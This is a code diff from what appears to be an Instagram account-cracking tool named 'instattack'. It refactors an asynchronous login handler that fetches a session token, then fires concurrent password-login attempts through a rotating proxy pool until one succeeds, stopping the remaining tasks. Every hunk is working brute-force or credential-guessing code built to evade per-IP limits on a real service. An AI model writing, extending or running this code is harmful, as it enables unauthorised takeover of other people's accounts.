@@ -2,20 +2,24 @@ import asyncio
 import aiohttp
 
 from instattack.config import config
+from instattack.lib import logger
 
-from instattack.lib.utils import (
-    limit_as_completed, cancel_remaining_tasks, start_and_stop)
+from instattack.lib.utils import limit_as_completed, start_and_stop
 
 from instattack.app.exceptions import TokenNotFound, PoolNoProxyError
 from instattack.app.proxies import AdvancedProxyPool
 
 from .base import AbstractRequestHandler
 from .proxies import BrokeredProxyHandler
-from .requests import login_request
-from .client import client
+from .client import instagram_client
+
+
+log = logger.get(__name__, 'Login Handler')
 
 
 class AbstractLoginHandler(AbstractRequestHandler):
+
+    __client__ = instagram_client
 
     def __init__(self, *args, **kwargs):
         super(AbstractLoginHandler, self).__init__(*args, **kwargs)
@@ -36,42 +40,12 @@ class AbstractLoginHandler(AbstractRequestHandler):
         if not self._cookies:
             sess = aiohttp.ClientSession(connector=self.connector)
 
-            self._token, self._cookies = await client.get_instagram_token(sess)
+            self._token, self._cookies = await self.client.get_token(sess)
             if not self._token:
                 raise TokenNotFound()
 
             await sess.close()
         return self._cookies
-
-    async def login_request(self, session, password, proxy):
-        return await login_request(
-            loop=self.loop,
-            session=session,
-            token=self.token,
-            password=password,
-            proxy=proxy,
-            on_proxy_success=self.on_proxy_success,
-            on_proxy_request_error=self.on_proxy_request_error,
-            on_proxy_response_error=self.on_proxy_response_error,
-        )
-
-    async def generate_attempts_for_passwords(self, session):
-        """
-        Generates coroutines for each password to be attempted and yields
-        them in the generator.
-
-        We don't have to worry about a stop event if the authenticated result
-        is found since this will generate relatively quickly and the coroutines
-        have not been run yet.
-        """
-        log = self.create_logger('password_attempt_generator')
-
-        while not self.passwords.empty():
-            password = await self.passwords.get()
-            if password:
-                yield self.attempt_login_with_password(session, password)
-
-        await log.debug('Passwords Queue is Empty')
 
     async def generate_attempts_for_proxies(self, session, password):
         """
@@ -86,7 +60,13 @@ class AbstractLoginHandler(AbstractRequestHandler):
             proxy = await self.proxy_handler.pool.get()
             if not proxy:
                 raise PoolNoProxyError()
-            yield self.login_request(session, password, proxy)
+
+            yield self.client.login(
+                session=session,
+                token=self.token,
+                password=password,
+                proxy=proxy,
+            )
 
     async def attempt_login_with_password(self, session, password):
         """
@@ -107,15 +87,21 @@ class AbstractLoginHandler(AbstractRequestHandler):
 
         batch_size = config['attempts']['batch_size']
 
+        num_tries = 0
         gen = self.generate_attempts_for_proxies(session, password)
-        async for result, num_tries, current_tasks in limit_as_completed(
-                gen, batch_size, stop_event):
+        async for fut in limit_as_completed(gen, batch_size, stop_event):
+            if fut.exception():
+                raise fut.exception()
+
+            result = fut.result()
+            num_tries += 1
 
             if result is not None:
                 stop_event.set()
 
-                # TODO: Maybe Put in Scheduler - We also might not need to do this.
-                await cancel_remaining_tasks(futures=current_tasks)
+                # [!] IMPORTANT:  We should reimplement returning the leftover
+                # tasks somehow, or at least cancel them in the utility, because
+                # that can lead to bogging down the requests.
                 return result, num_tries
 
     async def handle_attempt(self, result):
@@ -169,8 +155,6 @@ class LoginHandler(AbstractLoginHandler):
             return results[0]
 
     async def _login(self, password):
-        log = self.create_logger('_login')
-
         cookies = await self.cookies()
         await self.start_event.wait()
 
@@ -182,7 +166,6 @@ class LoginHandler(AbstractLoginHandler):
             result, num_tries = await self.attempt_login_with_password(session, password)
 
             log.debug(f'Required {num_tries} Attempts to Login')
-            log.done()
 
             await self.handle_attempt(result)
             return result
